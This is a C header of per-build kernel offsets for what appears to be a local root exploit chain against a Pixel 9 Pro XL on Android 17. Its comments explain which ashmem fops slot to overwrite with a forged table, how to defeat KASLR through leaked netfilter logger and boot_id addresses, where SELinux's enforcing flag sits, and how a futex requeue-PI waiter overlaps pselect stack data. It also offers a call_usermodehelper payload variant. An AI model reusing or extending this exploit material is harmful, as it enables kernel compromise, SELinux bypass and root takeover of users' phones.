// komodo — Pixel 9 Pro XL, Android 17
// Build:     CP2A.260705.006
// Kernel:    6.1.157-android14-11-gbd23337e42e7-ab14791245
// Interface: android14-6.1
//
// What this build does not share with its kernel interface. Everything else
// is supplied by the interface header included at the end.

#ifndef OFFSET_H
#define OFFSET_H

#if defined(APP_PAYLOAD) && APP_PAYLOAD
#define BUILD_VARIANT_LABEL "komodo-CP2A.260705.006-app"
#else
#define BUILD_VARIANT_LABEL "komodo-CP2A.260705.006-root-umh"
#endif
#ifndef BUILD_FINGERPRINT
#define BUILD_FINGERPRINT "google/komodo/komodo:17/CP2A.260705.006/15641320:user/release-keys"
#endif

// ── Base / memory layout ────────────────────────────────────────────────
// DIVERGENCE from blazer (0xffffffc080000000). On arm64, KIMAGE_VADDR ==
// MODULES_END == _PAGE_END(VA_BITS_MIN) + MODULES_VSIZE. This build has CONFIG_ARM64_VA_BITS=39, so _PAGE_END is
// 0xffffffc000000000, and the 6.1 module region is 128MB — giving
// 0xffffffc008000000. blazer's 6.6 kernel uses the 2GB module region
// introduced later, hence its +0x80000000. Both fall out of the same
// formula; the kernel line is what differs.
// Kernel version as (major<<16)|(minor<<8)|min(patch,255), from the
// `// Kernel:` line above. Declared so a stage can gate on it: a reclaim
// vehicle whose struct only exists from a given release is refused at
// `make check` for a target below it, instead of panicking the device.
#define KERNEL_VERSION_CODE 0x06019d  // 6.1.157

// ── Symbol offsets from the image base ──
#define ASHMEM_IOCTL_OFF            0x00c38d28ULL
#define ASHMEM_MMAP_OFF             0x00c396b8ULL
#define ASHMEM_OPEN_OFF             0x00c398d8ULL
#define ASHMEM_RELEASE_OFF          0x00c39960ULL
#define ASHMEM_SHOW_FDINFO_OFF      0x00c39a80ULL
#define ASHMEM_FOPS_OFF             0x01280b50ULL

// &ashmem_miscs[0].fops = ashmem_miscs + offsetof(struct miscdevice, fops)
// = 0x10. Same value as lynx, which is correct because lynx runs the byte
// identical kernel (6.1.157-android14-11-gbd23337e42e7-ab14791245).
//
// The slot to own is the miscdevice's own ->fops field, not the global
// misc_fops in drivers/char/misc.c. A freshly opened misc fd starts on
// misc_fops, but only for an instant: misc_open() looks the driver up by
// minor and then does
//     new_fops = fops_get(c->fops);   /* c is the miscdevice */
//     replace_fops(file, new_fops);
// so what decides the new fd's f_op is the miscdevice's own ->fops field, not
// the shared misc_fops it transiently had. An overwrite of misc_fops is undone
// by replace_fops() before the fd is ever usable, and misc_fops is const
// .rodata; misc_fops sits below ASHMEM_FOPS_OFF, this slot above it in .data.
// Owning the wrong slot leaves the ashmem f_op never
// overwritten, so try_cfi_stage() fails its step-4 read-back with nothing
// crashing to say so.
#define ASHMEM_MISC_FOPS_OFF        0x0217cb80ULL

// NAMING: kallsyms spells this `compat_ashmem_ioctl`, not
// `ashmem_compat_ioctl`. Cross-checked against the live ashmem_fops struct
// in the image: its compat_ioctl slot (FOPS_COMPAT_IOCTL_OFF, 0x58) holds
// exactly this address.
#define ASHMEM_COMPAT_IOCTL_OFF     0x00c39660ULL

#define CONFIGFS_READ_ITER_OFF      0x00464400ULL
#define CONFIGFS_BIN_WRITE_ITER_OFF 0x00464930ULL
#define NOOP_LLSEEK_OFF             0x003986dcULL
#define INIT_TASK_OFF               0x0201f640ULL
#define ROOT_TASK_GROUP_OFF         0x02208580ULL
#define SELINUX_BLOB_SIZES_OFF      0x015ceb88ULL
#define SECURITY_HOOK_HEADS_OFF     0x015ce478ULL
#define KMALLOC_CACHES_OFF          0x015cdfb8ULL
#define ANON_PIPE_BUF_OPS_OFF       0x01109910ULL
#define CALL_USERMODEHELPER_EXEC_WORK_OFF 0x000d36f4ULL
#define SYSTEM_UNBOUND_WQ_OFF       0x0200ae60ULL

// DIVERGENCE: `copy_splice_read` does not exist on 6.1 — it is the 6.6-era
// rename/rework of the generic "splice by driving ->read_iter" helper. Its
// 6.1 counterpart is `generic_file_splice_read`, which has the identical
// file_operations::splice_read prototype
// (struct file *, loff_t *, struct pipe_inode_info *, size_t, unsigned int)
// and likewise funnels through call_read_iter — i.e. into the
// configfs_read_iter we plant at FOPS_READ_ITER_OFF. The payload only ever
// *writes* this pointer into the forged fops table (util.c
// put_fake_fops_table, fops.c refresh table); it never splices through it,
// so it has to be a correctly-typed, plausible function pointer.
#define COPY_SPLICE_READ_OFF        0x003e5fd4ULL /* generic_file_splice_read */

// DIVERGENCE: 6.1 has no bare `selinux_enforcing` global — SELinux state
// lives in `struct selinux_state selinux_state`, and .enforcing is its first
// member (byte offset 0x0, per BTF), so the address is the struct's own.
// CONFIG_RANDSTRUCT is unset in the embedded IKCONFIG.
#define SELINUX_ENFORCING_OFF       0x0225a420ULL /* selinux_state + 0x0 */

// ── Slide references (KASLR bypass anchors) ─────────────────────────────
#define SLIDE_NFULNL_LOGGER_OFF     0x020129d0
// Write-free KASLR (cves/lib/kaslr/README.md): tracing_mark_write _THIS_IP_

#define SLIDE_TRACE_MARK_IP_OFF     0x001f0ac8ULL

// &loggers[0][1], not the `loggers` symbol itself. loggers is
//   struct nf_logger *loggers[NFPROTO_NUMPROTO][NF_LOG_TYPE_MAX]
// so [0][1] is one pointer in: the NFPROTO_UNSPEC / NF_LOG_TYPE_ULOG slot,
// which nfnetlink_log fills with &nfulnl_logger at registration. (The image
// confirms the type: nfulnl_logger.type reads 1 = NF_LOG_TYPE_ULOG.) Slot
// [0][0] is the LOG-type entry, which nothing registers and which stays zero —
// pointing the leak there makes boot_id read 16 zero bytes.
//
// Cross-checked against blazer: taking its 0x021221b0 as loggers+8 puts its
// loggers at 0x021221a8, giving nfulnl_logger - loggers = 0xb8 — the same
// 0xb8 measured here. Two different kernel lines agreeing on that distance
// confirms both the array layout and that blazer's value is also loggers+8.
#define SLIDE_LOGGERS_0_1_OFF       0x02012920ULL /* loggers(0x02012918) + 8 */

// slide.c plants this as the rb_left pointer of the forged waiter's rbtree
// nodes, so the tree
// rotation clobbers whatever sits there; fops.c restore_slide_boot_id() then
// puts the original value back. That tells us exactly what it must be: a
// kernel data slot whose correct content is &sysctl_bootid. That is the
// .data field of the `boot_id` entry in random_table[], located by walking
// random_table (0x02137c00) in 0x40-byte struct ctl_table strides to the
// entry whose procname is "boot_id" (index 4) and confirming its .data
// already equals sysctl_bootid (SLIDE_SYSCTL_BOOTID, below).
#define SLIDE_RANDOM_BOOT_ID_DATA_OFF 0x02137d08ULL /* &random_table[4].data */
#define SLIDE_SYSCTL_BOOTID_OFF     0x0227b498ULL

// DIVERGENCE: overrides slide.c's 0, the 6.6 value. It is where
// futex_wait_requeue_pi's on-stack rt_mutex_waiter lands relative to
// core_sys_select's stack_fds array, both
// measured from the same syscall-entry sp, so it falls out of this kernel's
// compiled stack frames. Read off the prologues of this image:
//
//   __arm64_sys_pselect6    sub sp, sp, #0x90
//   core_sys_select         sub sp, sp, #0x1c0 ; add x23, sp, #0x50  <- bits
//     => fd_sets   = sp_entry - 0x90 - 0x1c0 + 0x50  = sp_entry - 0x200
//
//   __arm64_sys_futex       sub sp, sp, #0x70
//   do_futex                sub sp, sp, #0x60
//   futex_wait_requeue_pi   sub sp, sp, #0x1b0 ; add x2, sp, #0x98   <- rt_waiter
//     (confirmed twice: same sp+0x98 is passed to rt_mutex_wait_proxy_lock
//      as its waiter argument and to rt_mutex_cleanup_proxy_lock)
//     => rt_waiter = sp_entry - 0x70 - 0x60 - 0x1b0 + 0x98 = sp_entry - 0x1e8
//
//   shift = (0x200 - 0x1e8) / 8 = 3 words
//
// All five frames are fixed-size with a single prologue adjustment, so there
// is no dynamic stack sizing to account for. With the waiter being 0x58 bytes
// (11 words), words 3..13 are used, which still lands inside in/out/ex
// (words 0..14) and never reaches the res_* half that core_sys_select memsets.
#define SLIDE_PSELECT_WORD_SHIFT 3

// DIVERGENCE: mm_struct->owner, 0x408 on blazer.
#define MM_OWNER_OFF                  824

#include "../kmi/android14-6.1.h"

#endif
